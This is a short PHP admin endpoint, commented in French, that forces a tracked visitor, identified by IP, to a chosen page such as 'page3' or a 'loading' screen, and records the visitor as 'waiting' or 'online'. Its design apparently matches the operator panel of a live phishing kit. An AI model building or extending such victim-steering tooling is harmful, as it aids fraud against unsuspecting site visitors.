<?php
session_start();
require_once '../config.php';

// Vérifier que l'admin est connecté
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'Not authenticated']);
    exit;
}

// Lire les données JSON
$data = json_decode(file_get_contents('php://input'), true);

$ip = $data['ip'] ?? '';
$page = $data['redirect'] ?? $data['page'] ?? '';

if (empty($ip) || empty($page)) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'error' => 'Missing parameters']);
    exit;
}

// Nettoyer l'IP
$cleanIP = explode(',', $ip)[0];
$cleanIP = trim($cleanIP);

// Définir la redirection immédiate
setRedirectForIP($cleanIP, $page);

// Créer un fichier de signal pour forcer la redirection
$signalFile = '../data/force_' . md5($cleanIP) . '.signal';
file_put_contents($signalFile, $page);

// Mettre à jour le statut du visiteur
if ($page === 'page3' || $page === 'loading') {
    updateVisitorStatus($cleanIP, $page, 'waiting');
} else {
    updateVisitorStatus($cleanIP, $page, 'online');
}

header('Content-Type: application/json');
echo json_encode([
    'success' => true, 
    'message' => 'Redirection forcée pour IP: ' . $cleanIP . ' vers: ' . $page,
    'ip' => $cleanIP,
    'page' => $page
]);
?>
